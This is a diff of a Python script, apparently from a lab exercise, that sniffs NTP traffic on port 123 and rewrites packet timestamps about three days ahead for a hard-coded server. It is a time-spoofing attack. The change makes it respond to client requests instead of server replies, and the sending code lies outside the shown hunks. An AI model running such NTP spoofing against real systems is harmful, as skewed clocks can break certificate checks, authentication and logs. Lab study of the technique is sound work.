@@ -6,13 +6,13 @@ import time, datetime
 server_ip = "10.10.10.12"
 ref_timestamp = time.time() + 259200
 #all these values are hard coded for the sake of this exercise
-def send_ntp(server, packet, ref_timestamp):
+def send_ntp(server, packet):
     ntp_packet = packet
     print("incoming packet")
     #ntp_packet.show()
     print()
 
-    ntp_packet[NTP].ref = ref_timestamp
+    #ntp_packet[NTP].ref = ref_timestamp
     ntp_packet[NTP].orig = time.time() + 259201
     ntp_packet[NTP].recv = time.time() + 259201
     ntp_packet[NTP].sent = time.time() + 259201
@@ -32,8 +32,8 @@ def send_ntp(server, packet, ref_timestamp):
 
 def ntp_request(packet):
     ntp_layer = packet.getlayer(NTP)
-    if ntp_layer and ntp_layer.mode == 4:
-        send_ntp(server_ip, packet, ref_timestamp)
+    if ntp_layer and ntp_layer.mode == 3:
+        send_ntp(server_ip, packet)
 
 if __name__ == "__main__":
     sniff(filter="udp and port 123", prn=ntp_request)
